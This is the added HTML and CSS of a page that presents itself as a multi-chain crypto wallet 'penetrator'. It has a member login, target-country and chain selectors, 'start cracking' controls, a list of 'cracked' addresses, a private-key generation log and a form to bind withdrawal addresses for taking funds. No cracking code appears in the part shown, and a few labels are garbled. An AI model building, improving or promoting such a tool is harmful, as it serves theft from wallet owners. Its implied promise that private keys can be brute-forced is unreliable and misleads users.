@@ -1,0 +1,1968 @@
+<!doctype html>
+<html lang="zh-CN" class="h-full">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>多链钱包渗透器2026版 · Pro Edition</title><!-- Libraries -->
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.8.1/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.5/index.min.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', sans-serif;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateX(-40px) scale(0.95); }
+      to { opacity: 1; transform: translateX(0) scale(1); }
+    }
+    
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.8; transform: scale(0.98); }
+    }
+    
+    @keyframes shimmer {
+      0% { background-position: -200% center; }
+      100% { background-position: 200% center; }
+    }
+    
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-10px); }
+    }
+    
+    @keyframes glow {
+      0%, 100% { box-shadow: 0 0 20px rgba(99, 102, 241, 0.3), 0 0 40px rgba(139, 92, 246, 0.2); }
+      50% { box-shadow: 0 0 30px rgba(99, 102, 241, 0.5), 0 0 60px rgba(139, 92, 246, 0.3); }
+    }
+    
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-10px); }
+      75% { transform: translateX(10px); }
+    }
+    
+    .fade-in {
+      animation: fadeIn 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    
+    .slide-in {
+      animation: slideIn 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    
+    .pulse-animation {
+      animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+    }
+    
+    .float-animation {
+      animation: float 3s ease-in-out infinite;
+    }
+    
+    .glass-card {
+      background: linear-gradient(135deg, rgba(30, 41, 59, 0.8), rgba(51, 65, 85, 0.6));
+      backdrop-filter: blur(20px) saturate(180%);
+      border: 2px solid rgba(99, 102, 241, 0.3);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3), 
+                  inset 0 1px 0 rgba(255, 255, 255, 0.05);
+      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .glass-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(99, 102, 241, 0.1), transparent);
+      transition: left 0.5s;
+    }
+    
+    .glass-card:hover::before {
+      left: 100%;
+    }
+    
+    .glass-card:hover {
+      border-color: rgba(99, 102, 241, 0.6);
+      box-shadow: 0 20px 60px rgba(99, 102, 241, 0.3), 
+                  0 0 80px rgba(139, 92, 246, 0.2),
+                  inset 0 1px 0 rgba(255, 255, 255, 0.1);
+      transform: translateY(-5px);
+    }
+    
+    .result-item {
+      animation: slideIn 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+      border-left: 4px solid #6366f1;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .result-item::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 0;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(99, 102, 241, 0.1));
+      transition: width 0.3s;
+    }
+    
+    .result-item:hover::after {
+      width: 100%;
+    }
+    
+    .result-item:hover {
+      transform: translateX(10px) scale(1.02);
+      border-left-color: #22d3ee;
+      background: linear-gradient(135deg, rgba(99, 102, 241, 0.15), rgba(139, 92, 246, 0.15));
+      box-shadow: 0 10px 30px rgba(99, 102, 241, 0.3);
+    }
+    
+    .gradient-text {
+      background: linear-gradient(135deg, #22d3ee 0%, #818cf8 50%, #ec4899 100%);
+      background-size: 300% 300%;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      animation: shimmer 4s ease-in-out infinite;
+      font-weight: 900;
+      letter-spacing: -0.5px;
+    }
+    
+    .stat-card {
+      background: linear-gradient(135deg, rgba(99, 102, 241, 0.15), rgba(139, 92, 246, 0.15));
+      border: 2px solid rgba(99, 102, 241, 0.3);
+      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .stat-card::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(99, 102, 241, 0.1) 0%, transparent 70%);
+      opacity: 0;
+      transition: opacity 0.3s;
+    }
+    
+    .stat-card:hover::before {
+      opacity: 1;
+    }
+    
+    .stat-card:hover {
+      transform: translateY(-8px) scale(1.03);
+      border-color: rgba(99, 102, 241, 0.6);
+      box-shadow: 0 15px 40px rgba(99, 102, 241, 0.3),
+                  0 0 60px rgba(139, 92, 246, 0.2);
+      animation: glow 2s ease-in-out infinite;
+    }
+    
+    .stat-number {
+      font-size: 2.5rem;
+      font-weight: 900;
+      background: linear-gradient(135deg, #22d3ee, #818cf8, #a78bfa);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      font-variant-numeric: tabular-nums;
+      letter-spacing: -1px;
+      text-shadow: 0 0 30px rgba(99, 102, 241, 0.5);
+      filter: drop-shadow(0 0 10px rgba(99, 102, 241, 0.3));
+    }
+    
+    .btn-primary {
+      background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 4px 15px rgba(99, 102, 241, 0.4);
+    }
+    
+    .btn-primary::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.3);
+      transform: translate(-50%, -50%);
+      transition: width 0.6s, height 0.6s;
+    }
+    
+    .btn-primary:active::before {
+      width: 300px;
+      height: 300px;
+    }
+    
+    .btn-primary:hover:not(:disabled) {
+      transform: translateY(-3px) scale(1.02);
+      box-shadow: 0 15px 40px rgba(99, 102, 241, 0.5),
+                  0 0 50px rgba(139, 92, 246, 0.3);
+      background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
+    }
+    
+    .btn-primary:active:not(:disabled) {
+      transform: translateY(-1px) scale(0.98);
+    }
+    
+    .btn-secondary {
+      background: rgba(15, 23, 42, 0.6);
+      border: 2px solid rgba(99, 102, 241, 0.4);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .btn-secondary::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      border-radius: 50%;
+      background: rgba(99, 102, 241, 0.2);
+      transform: translate(-50%, -50%);
+      transition: width 0.6s, height 0.6s;
+    }
+    
+    .btn-secondary:active::before {
+      width: 300px;
+      height: 300px;
+    }
+    
+    .btn-secondary:hover:not(:disabled) {
+      border-color: #6366f1;
+      background: linear-gradient(135deg, rgba(99, 102, 241, 0.2), rgba(139, 92, 246, 0.2));
+      box-shadow: 0 10px 30px rgba(99, 102, 241, 0.3);
+      transform: translateY(-2px);
+    }
+    
+    .chain-badge {
+      display: inline-block;
+      padding: 6px 16px;
+      border-radius: 12px;
+      font-weight: 800;
+      font-size: 11px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+      transition: all 0.3s;
+    }
+    
+    .chain-badge:hover {
+      transform: scale(1.05);
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
+    }
+    
+    .chain-tron {
+      background: linear-gradient(135deg, #eb0029, #ff4757);
+      color: white;
+      box-shadow: 0 4px 15px rgba(235, 0, 41, 0.4);
+    }
+    
+    .chain-eth {
+      background: linear-gradient(135deg, #627eea, #8b9fe8);
+      color: white;
+      box-shadow: 0 4px 15px rgba(98, 126, 234, 0.4);
+    }
+    
+    .chain-btc {
+      background: linear-gradient(135deg, #f7931a, #ffb84d);
+      color: white;
+      box-shadow: 0 4px 15px rgba(247, 147, 26, 0.4);
+    }
+    
+    .mono-text {
+      font-family: 'Consolas', 'Monaco', 'Menlo', 'Ubuntu Mono', 'Courier New', monospace;
+      font-size: 14px;
+      word-break: break-all;
+      line-height: 1.8;
+      padding: 12px;
+      background: rgba(15, 23, 42, 0.6);
+      border-radius: 8px;
+      border: 1px solid rgba(99, 102, 241, 0.3);
+      transition: all 0.3s;
+      letter-spacing: 0.5px;
+      font-weight: 500;
+    }
+    
+    .mono-text:hover {
+      background: rgba(30, 41, 59, 0.8);
+      border-color: rgba(99, 102, 241, 0.5);
+      box-shadow: 0 0 20px rgba(99, 102, 241, 0.3);
+    }
+    
+    input, select {
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    
+    input:focus, select:focus {
+      outline: none;
+      border-color: #6366f1 !important;
+      box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15),
+                  0 10px 30px rgba(99, 102, 241, 0.2);
+      transform: translateY(-2px);
+    }
+    
+    .scroll-container {
+      max-height: 600px;
+      overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: #6366f1 #1e293b;
+    }
+    
+    .scroll-container::-webkit-scrollbar {
+      width: 10px;
+    }
+    
+    .scroll-container::-webkit-scrollbar-track {
+      background: linear-gradient(180deg, rgba(30, 41, 59, 0.5), rgba(51, 65, 85, 0.5));
+      border-radius: 10px;
+      border: 1px solid rgba(99, 102, 241, 0.2);
+    }
+    
+    .scroll-container::-webkit-scrollbar-thumb {
+      background: linear-gradient(180deg, #6366f1, #8b5cf6);
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(99, 102, 241, 0.5);
+    }
+    
+    .scroll-container::-webkit-scrollbar-thumb:hover {
+      background: linear-gradient(180deg, #818cf8, #a78bfa);
+      box-shadow: 0 0 15px rgba(99, 102, 241, 0.7);
+    }
+    
+    label {
+      font-weight: 600;
+      letter-spacing: 0.3px;
+    }
+    
+    .copy-btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3);
+    }
+    
+    .copy-btn:active {
+      transform: scale(0.95);
+    }
+    
+    #connectBackend:hover:not(:disabled) {
+      transform: translateY(-2px) scale(1.03);
+      box-shadow: 0 10px 30px rgba(34, 211, 238, 0.5);
+      background: linear-gradient(135deg, #06b6d4, #0891b2);
+    }
+    
+    #connectBackend:active:not(:disabled) {
+      transform: translateY(0) scale(0.98);
+    }
+    
+    .speed-toggle-slider {
+      background: rgba(71, 85, 105, 0.5);
+    }
+    
+    .speed-toggle-slider::before {
+      content: '';
+      position: absolute;
+      height: 22px;
+      width: 22px;
+      left: 3px;
+      bottom: 3px;
+      background: white;
+      border-radius: 50%;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+    }
+    
+    input:checked + .speed-toggle-slider {
+      background: linear-gradient(135deg, #ec4899, #8b5cf6);
+      box-shadow: 0 0 20px rgba(236, 72, 153, 0.5);
+    }
+    
+    input:checked + .speed-toggle-slider::before {
+      transform: translateX(28px);
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
+    }
+    
+    .lang-switch {
+      background: rgba(15, 23, 42, 0.6);
+      border: 2px solid rgba(99, 102, 241, 0.4);
+      padding: 8px 16px;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.3s;
+      font-weight: 700;
+      font-size: 14px;
+    }
+    
+    .lang-switch:hover {
+      border-color: #6366f1;
+      background: linear-gradient(135deg, rgba(99, 102, 241, 0.2), rgba(139, 92, 246, 0.2));
+      box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3);
+      transform: translateY(-2px);
+    }
+    
+
+
+    /* Dashboard hierarchy: controls, metrics, then detailed logs. */
+    body { background: #0b1220 !important; }
+    header { padding: 24px 32px !important; background: #101a2b !important; box-shadow: none !important; }
+    header .mb-6 { margin-bottom: 0; }
+    #mainTitle { font-size: clamp(20px, 2.3vw, 28px); line-height: 1.35; }
+    #mainTitle > span:first-child { font-size: 28px; }
+    .gradient-text { animation: none; background: none; -webkit-text-fill-color: #a5b4fc; color: #a5b4fc; }
+    .float-animation { animation: none; }
+    #dashboard { padding-top: 28px; padding-bottom: 28px; }
+    .workspace-grid { align-items: start; gap: 24px; }
+    #dashboard .glass-card { padding: 28px; border-radius: 18px; background: #111c2e; border: 1px solid #27354a; box-shadow: 0 8px 24px #00000018; }
+    .glass-card::before { display: none; }
+    .glass-card:hover { transform: none; }
+    #dashboard h2 { font-size: 20px; line-height: 1.4; margin-bottom: 24px; }
+    #dashboard h2 > .float-animation { font-size: 22px; margin-right: 10px; }
+    #dashboard label { color: #b9c5d8; font-size: 13px; }
+    #dashboard input, #dashboard select { border: 1px solid #35445d !important; background: #0c1524 !important; padding: 12px 14px; font-size: 14px; }
+    input:focus, select:focus { transform: none; box-shadow: 0 0 0 3px #818cf826; }
+    #dashboard .mb-7 { margin-bottom: 22px; }
+    #dashboard .btn-primary, #dashboard .btn-secondary { padding: 14px 16px; font-size: 15px; border-radius: 10px; }
+    .btn-primary { background: #6366f1; box-shadow: 0 4px 12px #6366f126; }
+    .btn-primary:hover:not(:disabled) { background: #7375f5; transform: none; box-shadow: 0 4px 16px #6366f133; }
+    .btn-secondary { background: #1a263a; border: 1px solid #3c4a61; box-shadow: none; }
+    button:disabled { opacity: .4; cursor: not-allowed; }
+    button:focus-visible, .lang-switch:focus-visible { outline: 2px solid #a5b4fc; outline-offset: 4px; }
+    .configuration-panel > .grid { margin-top: 0; gap: 12px; }
+    #dashboard .stat-card { background: #162338; border: 1px solid #2c3d57; padding: 18px 14px; border-radius: 12px; box-shadow: none; }
+    .stat-card:hover { transform: none; animation: none; box-shadow: none; }
+    .stat-card > .float-animation { display: none; }
+    .stat-number { font-size: clamp(23px, 2.3vw, 32px); line-height: 1.25; background: none; -webkit-text-fill-color: #eef2ff; color: #eef2ff; filter: none; text-shadow: none; letter-spacing: -.5px; overflow-wrap: anywhere; }
+    .configuration-panel > .stat-card { margin-top: 12px; margin-bottom: 26px; }
+    #runtime { font-size: 25px; }
+    #keygenProcess, #favoriteKeygenProcess, #crackedList { background: #0a1322 !important; border: 1px solid #2a3750 !important; box-shadow: none; }
+    #keygenProcess, #favoriteKeygenProcess { color: #94a3b8 !important; font-size: 12px !important; line-height: 1.8 !important; }
+    #crackedList { min-height: 88px !important; }
+    .results-panel { border-top: 2px solid #818cf8 !important; }
+    #results { max-height: 860px; padding-right: 6px; }
+    .result-item { border-left-width: 2px; box-shadow: none !important; }
+    .result-item:hover { transform: none; box-shadow: none; }
+    .result-item::after { display: none; }
+    .mono-text { font-size: 12px; padding: 10px; line-height: 1.7; letter-spacing: 0; }
+    .mono-text:hover { box-shadow: none; }
+    .chain-badge { padding: 4px 9px; font-size: 10px; border-radius: 6px; box-shadow: none; }
+    #connectBackend, #versionBadge, #withdrawalBtn, #transferBtn { box-shadow: none !important; }
+    #connectBackend { background: #1c2b43 !important; border: 1px solid #3c506c !important; padding: 10px 14px; }
+    #versionBadge { padding: 7px 12px; font-size: 11px; border-radius: 6px; }
+    #dashboard > section { margin-top: 24px; }
+    #dashboard > section > .mb-8 { margin-bottom: 20px; }
+    #dashboard > section > div[style] { border: 1px solid #2c3d57 !important; background: #131f32 !important; }
+    #dashboard table { min-width: 560px; }
+    #dashboard th { color: #b9c5d8; font-size: 12px; }
+    #dashboard td { font-size: 13px; }
+    #dashboard td[colspan] { padding-top: 36px; padding-bottom: 36px; }
+    footer { margin-top: 20px !important; padding: 20px 16px !important; }
+    .scroll-container { scrollbar-width: thin; scrollbar-color: #40516c #111c2e; overflow-x: auto; }
+    @media (min-width: 1024px) { .workspace-grid { grid-template-columns: minmax(0, .95fr) minmax(0, 1.25fr); } }
+    @media (max-width: 767px) {
+      header { padding: 20px 16px !important; }
+      header > div > .flex { flex-wrap: wrap; gap: 16px; }
+      header .gap-4 { gap: 8px; flex-wrap: wrap; }
+      #dashboard { padding: 20px 14px; }
+      #dashboard .glass-card { padding: 20px; }
+      #dashboard h2 { font-size: 18px; }
+      #results { max-height: 520px; }
+      #versionBadge { display: none; }
+      #loginScreen .glass-card { padding: 28px; }
+    }
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after { animation: none !important; transition: none !important; scroll-behavior: auto !important; }
+    }
+  </style>
+  <script src="/_sdk/element_sdk.js" type="text/javascript"></script>
+  <style>@view-transition { navigation: auto; }</style>
+  <script src="/_sdk/data_sdk.js" type="text/javascript"></script>
+ </head>
+ <body class="h-full" style="background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #1e293b 100%); backdrop-filter: blur(20px); color: #e2e8f0;"><!-- Login Screen -->
+  <div id="loginScreen" class="fixed inset-0 flex items-center justify-center" style="background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #1e293b 100%); z-index: 9999;">
+   <div class="glass-card rounded-3xl p-10 shadow-2xl fade-in" style="max-width: 480px; width: 90%;">
+    <div class="text-center mb-8">
+     <div class="text-6xl mb-4 float-animation">
+      🔐
+     </div>
+     <h2 class="text-3xl font-bold mb-2"><span class="gradient-text" id="loginTitle">安全验证</span></h2>
+     <p class="text-sm opacity-75" id="loginSubtitle">请输入访问密码以继续</p>
+    </div>
+    <form id="loginForm" class="space-y-6">
+     <div><label for="memberId" class="block text-sm font-semibold mb-3 opacity-90" id="memberIdLabel">会员号</label> <input type="text" id="memberId" placeholder="请输入会员号" class="w-full px-5 py-4 rounded-xl text-base" style="background: rgba(15, 23, 42, 0.8); border: 2px solid rgba(99, 102, 241, 0.4); color: #e2e8f0;" autocomplete="off">
+     </div>
+     <div><label for="password" class="block text-sm font-semibold mb-3 opacity-90" id="passwordLabel">访问密码</label> <input type="password" id="password" placeholder="请输入密码" class="w-full px-5 py-4 rounded-xl text-base" style="background: rgba(15, 23, 42, 0.8); border: 2px solid rgba(99, 102, 241, 0.4); color: #e2e8f0;" autocomplete="off">
+     </div>
+     <div id="loginError" class="hidden p-4 rounded-xl" style="background: rgba(239, 68, 68, 0.15); border: 2px solid rgba(239, 68, 68, 0.5);">
+      <div class="flex items-center gap-2 text-sm"><span class="text-xl">⚠️</span> <span style="color: #ef4444;" id="loginErrorText">会员号或密码错误，请重试</span>
+      </div>
+     </div><button type="submit" id="loginBtn" class="btn-primary w-full py-4 rounded-xl font-bold text-lg text-white"> 🔓 <span id="loginBtnText">验证登录</span> </button>
+    </form><!-- Language Switch in Login -->
+    <div class="mt-6 text-center"><button id="loginLangSwitch" class="lang-switch"> 🌐 <span id="loginLangText">English</span> </button>
+    </div>
+   </div>
+  </div><!-- Main Content -->
+  <div id="mainContent" style="display: none;"><!-- Header -->
+   <header class="px-10 py-8 border-b" style="border-color: rgba(99, 102, 241, 0.2); backdrop-filter: blur(20px); background: rgba(15, 23, 42, 0.8); box-shadow: 0 4px 30px rgba(0, 0, 0, 0.3);">
+    <div class="max-w-7xl mx-auto fade-in">
+     <div class="flex justify-between items-center mb-6">
+      <h1 id="mainTitle" class="text-4xl font-extrabold tracking-tight flex items-center gap-3"><span class="text-5xl float-animation">🔐</span> <span>多链 <span class="gradient-text">钱包渗透器2026版</span></span></h1>
+      <div class="flex items-center gap-4"><button id="langSwitch" class="lang-switch"> 🌐 <span id="langText">English</span> </button> <button id="connectBackend" class="px-6 py-3 rounded-xl font-bold text-sm text-white transition-all" style="background: linear-gradient(135deg, #22d3ee, #06b6d4); border: 2px solid rgba(34, 211, 238, 0.5); box-shadow: 0 4px 15px rgba(34, 211, 238, 0.3);"> 🔌 <span id="connectBtnText">连接后台</span> </button>
+       <div id="versionBadge" class="px-6 py-3 rounded-full text-sm font-bold" style="background: linear-gradient(135deg, rgba(99, 102, 241, 0.2), rgba(139, 92, 246, 0.2)); color: #22d3ee; border: 2px solid rgba(99, 102, 241, 0.3); box-shadow: 0 4px 15px rgba(99, 102, 241, 0.2);">
+        ⚡ Pro Edition
+       </div>
+      </div>
+     </div>
+    </div>
+   </header><!-- Main Content -->
+   <main class="max-w-7xl mx-auto px-10 py-12" id="dashboard">
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 workspace-grid"><!-- Left Panel - Configuration -->
+     <section class="glass-card rounded-3xl p-10 shadow-2xl fade-in configuration-panel">
+      <h2 id="systemPanelTitle" class="text-3xl font-bold mb-8 flex items-center"><span class="text-4xl mr-4 float-animation">⚙️</span> <span style="background: linear-gradient(135deg, #e2e8f0, #cbd5e1); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">渗透系统</span></h2><!-- Chain Selection -->
+      <div class="mb-7"><label id="networkLabel" class="block text-sm font-semibold mb-3 opacity-90">区块链网络</label> <select id="chain" class="w-full px-5 py-4 rounded-xl text-base font-medium" style="background: rgba(15, 23, 42, 0.8); border: 2px solid rgba(99, 102, 241, 0.4); color: #e2e8f0; cursor: pointer;"> <option value="tron">🔴 TRON (TRC20)</option> <option value="eth">🔵 Ethereum (ERC20)</option> <option value="btc">��� Bitcoin (Legacy)</option> </select>
+      </div><!-- Country/Region Selection -->
+      <div class="mb-7"><label class="block text-sm font-semibold mb-3 opacity-90" id="countryLabel">🎯 目标国家/地区</label> <select id="country" class="w-full px-5 py-4 rounded-xl text-base font-medium" style="background: rgba(15, 23, 42, 0.8); border: 2px solid rgba(99, 102, 241, 0.4); color: #e2e8f0; cursor: pointer;"> <option value="global">🌍 全球 (Global)</option> <option value="us">🇺🇸 美国 (United States)</option> <option value="cn">🇨 中国 (China)</option> <option value="jp">🇯🇵 日本 (Japan)</option> <option value="kr">🇰🇷 韩国 (South Korea)</option> <option value="gb">🇬🇧 英国 (United Kingdom)</option> <option value="de">🇩🇪 德国 (Germany)</option> <option value="fr">🇫🇷 法国 (France)</option> <option value="ca">🇨🇦 加拿大 (Canada)</option> <option value="au">🇦🇺 澳大利亚 (Australia)</option> <option value="sg">🇸🇬 新加坡 (Singapore)</option> <option value="hk">🇭🇰 香港 (Hong Kong)</option> <option value="tw">🇹🇼 台湾 (Taiwan)</option> <option value="ru">🇷🇺 俄罗斯 (Russia)</option> <option value="in">🇮🇳 印度 (India)</option> <option value="br">🇧🇷 巴西 (Brazil)</option> <option value="mx">🇲🇽 墨西哥 (Mexico)</option> <option value="es">🇪西班牙 (Spain)</option> <option value="it">🇮🇹 意大利 (Italy)</option> <option value="nl">🇳🇱 荷兰 (Netherlands)</option> <option value="se">🇸🇪 瑞典 (Sweden)</option> <option value="ch">🇨🇭 瑞士 (Switzerland)</option> <option value="ae">🇦🇪 阿联酋 (UAE)</option> <option value="sa">🇸沙地阿拉伯 (Saudi Arabia)</option> <option value="tr">🇹🇷 土耳其 (Turkey)</option> <option value="za">🇿🇦 南非 (South Africa)</option> <option value="th">🇹🇭 泰国 (Thailand)</option> <option value="vn">🇻🇳 越南 (Vietnam)</option> <option value="id">🇮🇩 印度尼西亚 (Indonesia)</option> <option value="my">🇲🇾 马来西亚 (Malaysia)</option> <option value="ph">🇵🇭 菲律宾 (Philippines)</option> </select>
+      </div><!-- Speed Booster Toggle -->
+      <div class="mb-7 p-5 rounded-xl" style="background: linear-gradient(135deg, rgba(236, 72, 153, 0.1), rgba(139, 92, 246, 0.1)); border: 2px solid rgba(236, 72, 153, 0.3);">
+       <div class="flex items-center justify-between">
+        <div class="flex items-center gap-3"><span class="text-2xl">🚀</span>
+         <div>
+          <div class="text-sm font-bold" style="color: #ec4899;" id="boosterTitle">
+           提速器
+          </div>
+          <div class="text-xs opacity-75 mt-1" id="boosterDesc">
+           开启后速度翻倍
+          </div>
+         </div>
+        </div><label class="relative inline-block w-14 h-7 cursor-pointer"> <input type="checkbox" id="speedBooster" class="opacity-0 w-0 h-0"> <span class="speed-toggle-slider absolute top-0 left-0 right-0 bottom-0 rounded-full transition-all" style="background: rgba(71, 85, 105, 0.5);"></span> </label>
+       </div>
+      </div><!-- Action Buttons -->
+      <div class="flex gap-5 mb-6"><button id="start" class="btn-primary flex-1 py-5 rounded-xl font-bold text-lg text-white"> <span id="startButtonText">✨ 开始破解</span> </button> <button id="stop" class="btn-secondary flex-1 py-5 rounded-xl font-bold text-lg text-white" disabled> <span id="stopButtonText">⏸️ 停止</span> </button>
+      </div><!-- Statistics Cards -->
+      <div class="grid grid-cols-2 gap-5 mt-8">
+       <div class="stat-card rounded-2xl p-6 text-center">
+        <div class="text-4xl mb-3 float-animation">
+         🎯
+        </div>
+        <div class="stat-number" id="tries">
+         0
+        </div>
+        <div id="triesLabel" class="text-xs font-semibold opacity-75 mt-2">
+         尝试次数
+        </div>
+       </div>
+       <div class="stat-card rounded-2xl p-6 text-center">
+        <div class="text-4xl mb-3 float-animation" style="animation-delay: 0.2s;">
+         ⚡️
+        </div>
+        <div class="stat-number" id="speed">
+         0
+        </div>
+        <div id="speedLabel" class="text-xs font-semibold opacity-75 mt-2">
+         速度 / 秒
+        </div>
+       </div>
+      </div><!-- Runtime Display -->
+      <div class="stat-card rounded-2xl p-6 text-center mt-5">
+       <div class="text-4xl mb-3 float-animation" style="animation-delay: 0.4s;">
+        ⏱️
+       </div>
+       <div class="stat-number" id="runtime">
+        00:00:00
+       </div>
+       <div id="runtimeLabel" class="text-xs font-semibold opacity-75 mt-2">
+        运行时间
+       </div>
+      </div>
+<!-- Successfully Cracked Addresses List -->
+      <div class="mb-7"><label class="block text-sm font-semibold mb-3 opacity-90" id="crackedLabel">✅ 成功破解地址</label>
+       <div id="crackedList" class="rounded-xl p-4" style="background: rgba(15, 23, 42, 0.9); border: 2px solid rgba(34, 211, 238, 0.4); min-height: 120px; max-height: 200px; overflow-y: auto;">
+        <div class="opacity-50 text-center py-6 text-sm" id="crackedEmpty">
+         暂无成功破解的地址...
+        </div>
+       </div>
+      </div><!-- Private Key Generation Process -->
+      <div class="mb-7"><label class="block text-sm font-semibold mb-3 opacity-90" id="keygenLabel">私钥生成过程</label>
+       <div id="keygenProcess" class="rounded-xl p-4 mono-text" style="background: rgba(15, 23, 42, 0.9); border: 2px solid rgba(139, 92, 246, 0.4); min-height: 80px; max-height: 120px; overflow-y: auto; color: #a78bfa; font-size: 11px; line-height: 1.6;">
+        <div class="opacity-50 text-center py-6" id="keygenEmpty">
+         等待开始破解...
+        </div>
+       </div>
+      </div>
+     </section><!-- Right Panel - Results -->
+     <section class="glass-card rounded-3xl p-10 shadow-2xl fade-in results-panel">
+      <h2 id="resultsPanelTitle" class="text-3xl font-bold mb-8 flex items-center"><span class="text-4xl mr-4 float-animation" style="animation-delay: 0.3s;">🎯</span> <span style="background: linear-gradient(135deg, #e2e8f0, #cbd5e1); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">渗透过程</span></h2><!-- Results Container -->
+      <div id="results" class="scroll-container space-y-4">
+       <div class="text-center py-24 opacity-50">
+        <div class="text-7xl mb-5 float-animation">
+         🔍
+        </div>
+        <div class="text-xl font-semibold" id="resultsEmpty">
+         等待开始破解...
+        </div>
+        <div class="text-sm opacity-75 mt-2" id="resultsEmptyDesc">
+         点击"开始破解"按钮启动破解程序
+        </div>
+       </div>
+      </div>
+     </section>
+    </div><!-- Withdrawal Address Section -->
+    <section class="glass-card rounded-3xl p-10 shadow-2xl fade-in mt-8">
+     <div class="mb-8">
+      <h2 class="text-3xl font-bold flex items-center"><span class="text-4xl mr-4 float-animation" style="animation-delay: 0.5s;">💰</span> <span style="background: linear-gradient(135deg, #e2e8f0, #cbd5e1); -webkit-background-clip: text; -webkit-text-fill-color: transparent;" id="withdrawalTitle">绑定出款地址</span></h2>
+     </div><!-- Withdrawal Address Form -->
+     <div class="mb-8 p-6 rounded-2xl" style="background: linear-gradient(135deg, rgba(251, 191, 36, 0.08), rgba(245, 158, 11, 0.08)); border: 2px solid rgba(251, 191, 36, 0.3);">
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-4 items-end mb-4">
+       <div><label class="block text-sm font-semibold mb-2 opacity-90" id="withdrawalNetworkLabel">网络</label> <select id="withdrawalNetwork" class="w-full px-4 py-3 rounded-xl text-base font-medium" style="background: rgba(15, 23, 42, 0.8); border: 2px solid rgba(99, 102, 241, 0.4); color: #e2e8f0; cursor: pointer;"> <option value="TRON">TRON</option> <option value="ETHEREUM">ETHEREUM</option> <option value="BITCOIN">BITCOIN</option> </select>
+       </div>
+       <div><label class="block text-sm font-semibold mb-2 opacity-90" id="withdrawalAddressLabel">出款地址</label> <input id="withdrawalAddress" type="text" placeholder="输入出款地址" class="w-full px-4 py-3 rounded-xl text-base" style="background: rgba(15, 23, 42, 0.8); border: 2px solid rgba(99, 102, 241, 0.4); color: #e2e8f0;">
+       </div>
+       <div><button id="withdrawalBtn" class="w-full py-3 rounded-xl font-bold text-base text-white transition-all" style="background: linear-gradient(135deg, #fbbf24, #f59e0b); box-shadow: 0 4px 15px rgba(251, 191, 36, 0.4);"> 💰 <span id="withdrawalBtnText">添加����址</span> </button>
+       </div>
+      </div>
+     </div><!-- Withdrawal Address Table -->
+     <div class="scroll-container mb-10" style="max-height: 400px;">
+      <table class="w-full">
